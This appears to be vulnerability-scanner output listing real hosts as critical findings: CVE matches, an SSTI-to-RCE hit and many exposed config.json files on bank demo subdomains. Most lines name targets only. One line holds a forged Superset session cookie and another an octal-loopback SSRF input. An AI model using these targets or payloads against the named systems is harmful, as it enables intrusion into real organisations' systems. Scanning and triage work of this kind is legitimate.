+[config-json-exposure-fuzz] [http] [critical] https://api.mainnet.orca.so/db/config.json [path="/db/config.json"]
+[CVE-2026-33032] [http] [critical] https://rpc.testnet.arc.network/mcp_message
+[pdf-signer-ssti-to-rce] [http] [critical] https://docs.blockend.com
+[CVE-2021-28918] [http] [critical] https://docs.nexus.xyz/?url=http://0177.0.0.1/server-status
+[CVE-2023-27524] [http] [critical] https://reports.qa-nia.consint.ai/api/v1/database/1 [path="1",session="eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_fg.KalpJbMq1SZPCBuunG9-ycDX9HM"]
+[CVE-2024-29972] [http] [critical] https://cli.nexus.xyz/desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc
+[CVE-2025-29927] [http] [critical] https://app.v1.mitosis.org
+[CVE-2025-29927] [http] [critical] https://morph.mitosis.org
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://abn.abn-amro-sandbox.demo2.swiat.io/config/config.json [""baseUrl": "https://abn.abn-amro-sandbox.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://abn.demo-abnamro.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ads.demo-ads.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://app.swiat.io/config/config.json [""baseUrl": "https://app.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://barclays.demo-barclays.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://bayernlb.demo-bayernlb-erc20.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://bayernlb.demo-bayernlb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://bg.demo-bank-of-greece.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blb.demo-bayernlb.demo2.swiat.io/config/config.json [""baseUrl": "https://blb.demo-bayernlb.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blb.demo-pontes.demo2.swiat.io/config/config.json [""baseUrl": "https://blb.demo-pontes.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.ba-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dea-1.dev3.swiat.io/config/config.json [""baseUrl": "https://blue.dea-1.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.delphi-pontes-pilot.demo1.swiat.io/config/config.json [""baseUrl": "https://blue.delphi-pontes-pilot.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-1.demo2.swiat.io/config/config.json [""baseUrl": "https://blue.demo-1.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-13.demo2.swiat.io/config/config.json [""baseUrl": "https://blue.demo-13.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-3.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-360x.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-6.demo2.swiat.io/config/config.json [""baseUrl": "https://blue.demo-6.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-9.demo2.swiat.io/config/config.json [""baseUrl": "https://blue.demo-9.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-ccx.demo2.swiat.io/config/config.json [""baseUrl": "https://blue.demo-ccx.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-ecb-repo.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-evonik.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-ewpg-issuance.demo1.swiat.io/config/config.json [""baseUrl": "https://blue.demo-ewpg-issuance.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-kinexys.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-kreissparkasse-koeln.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-lbbw.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-national-bank-of-dubai.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-niedersachsen.demo1.swiat.io/config/config.json [""baseUrl": "https://blue.demo-niedersachsen.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-playground-felix.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.demo-registrar.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-1.dev2.swiat.io/config/config.json [""baseUrl": "https://blue.dev-1.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-1.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-2.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-3.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-3.dev3.swiat.io/config/config.json [""baseUrl": "https://blue.dev-3.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-connex.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-connex.dev2.swiat.io/config/config.json [""baseUrl": "https://blue.dev-connex.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-netmgr.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-ops-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.dev-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.doc-1.dev3.swiat.io/config/config.json [""baseUrl": "https://blue.doc-1.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.int-1.dev1.swiat.io/config/config.json [""baseUrl": "https://blue.int-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.int-2.dev1.swiat.io/config/config.json [""baseUrl": "https://blue.int-2.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.int-3.dev1.swiat.io/config/config.json [""baseUrl": "https://blue.int-3.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.int-patch-2.dev2.swiat.io/config/config.json [""baseUrl": "https://blue.int-patch-2.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.int-patch.dev2.swiat.io/config/config.json [""baseUrl": "https://blue.int-patch.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.int-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.int-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.pft-1.pft1.swiat.io/config/config.json [""baseUrl": "https://blue.pft-1.pft1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.qa-1.dev1.swiat.io/config/config.json [""baseUrl": "https://blue.qa-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.qa-3.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.qa-3.dev3.swiat.io/config/config.json [""baseUrl": "https://blue.qa-3.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.qa-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.qa-ssf-3.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://blue.qa-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://bny.demo-bny.demo2.swiat.io/config/config.json [""baseUrl": "https://bny.demo-bny.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://bny.demo-deka.demo2.swiat.io/config/config.json [""baseUrl": "https://bny.demo-deka.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://bog.demo-bog-payment.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://buba.demo-buba.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cbi.demo-cbi.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.demo-9.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-9.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.demo-bny.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-bny.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.demo-ccx.demo2.swiat.io/config/config.json [""baseUrl": "https://ccx.demo-ccx.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.demo-deka.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.demo-national-bank-of-dubai.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.demo-scb.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-scb.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.dev-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.dev-1.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.dev-connex.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.dev-connex.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.dev-connex.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.int-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.int-2.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.pft-1.pft1.swiat.io/config/config.json [""baseUrl": "https://swiat.pft-1.pft1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.qa-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ccx.qanet.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://ceca.demo-cecabank.demo1.swiat.io/config/config.json [""baseUrl": "https://ceca.demo-cecabank.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://collateral-connex.demo-ccx.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.demo-ccx.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cpb.dev-ops-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cpb.dev-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cpb.int-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cpb.int-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cpb.qa-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cpb.qa-ssf-3.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cpb.qa-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.abn-amro-sandbox.demo2.swiat.io/config/config.json [""baseUrl": "https://cyan.abn-amro-sandbox.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-1.demo2.swiat.io/config/config.json [""baseUrl": "https://cyan.demo-1.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-360x.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-6.demo2.swiat.io/config/config.json [""baseUrl": "https://cyan.demo-6.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-9.demo2.swiat.io/config/config.json [""baseUrl": "https://cyan.demo-9.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-barclays.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-bayernlb-erc20.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-bny.demo2.swiat.io/config/config.json [""baseUrl": "https://cyan.demo-bny.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-bog-payment.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-buba.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-cbi.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-cecabank.demo1.swiat.io/config/config.json [""baseUrl": "https://cyan.demo-cecabank.demo1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-deka-erc20.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-deka.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-dvp.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-dws.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-ecb-repo.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-eib.demo2.swiat.io/config/config.json [""baseUrl": "https://cyan.demo-eib.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-evonik.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-gft.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-ing-bank.demo1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-kinexys.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-kreissparkasse-koeln.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-national-bank-of-dubai.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-ntt.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-olea.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-playground-felix.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-registrar.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-scb-dcm.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-scb.demo2.swiat.io/config/config.json [""baseUrl": "https://cyan.demo-scb.demo2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-state-street.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-tt.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.demo-wts.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-1.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-1.dev2.swiat.io/config/config.json [""baseUrl": "https://cyan.dev-1.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-1.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-2.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-3.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-3.dev3.swiat.io/config/config.json [""baseUrl": "https://cyan.dev-3.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-connex.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-connex.dev2.swiat.io/config/config.json [""baseUrl": "https://cyan.dev-connex.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-netmgr.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-ops-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.dev-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.doc-1.dev3.swiat.io/config/config.json [""baseUrl": "https://cyan.doc-1.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.int-1.dev1.swiat.io/config/config.json [""baseUrl": "https://cyan.int-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.int-2.dev1.swiat.io/config/config.json [""baseUrl": "https://cyan.int-2.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.int-3.dev1.swiat.io/config/config.json [""baseUrl": "https://cyan.int-3.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.int-patch-2.dev2.swiat.io/config/config.json [""baseUrl": "https://cyan.int-patch-2.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.int-patch.dev2.swiat.io/config/config.json [""baseUrl": "https://cyan.int-patch.dev2.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.int-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.int-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.pft-1.pft1.swiat.io/config/config.json [""baseUrl": "https://cyan.pft-1.pft1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.qa-1.dev1.swiat.io/config/config.json [""baseUrl": "https://cyan.qa-1.dev1.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.qa-2.dev3.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.qa-3.dev1.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.qa-deka.dev3.swiat.io/config/config.json [""baseUrl": "https://cyan.qa-deka.dev3.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.qa-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.qa-ssf-3.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://cyan.qa-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.ba-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.demo-3.demo2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.dev-ops-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.dev-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.dev-ssf.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
+[config-json-exposure-fuzz:base_urls] [http] [critical] https://db.int-ssf-2.dev2.swiat.io/config/config.json [""baseUrl": "https://swiat.bughunt.swiat.io""] [path="/config/config.json"]
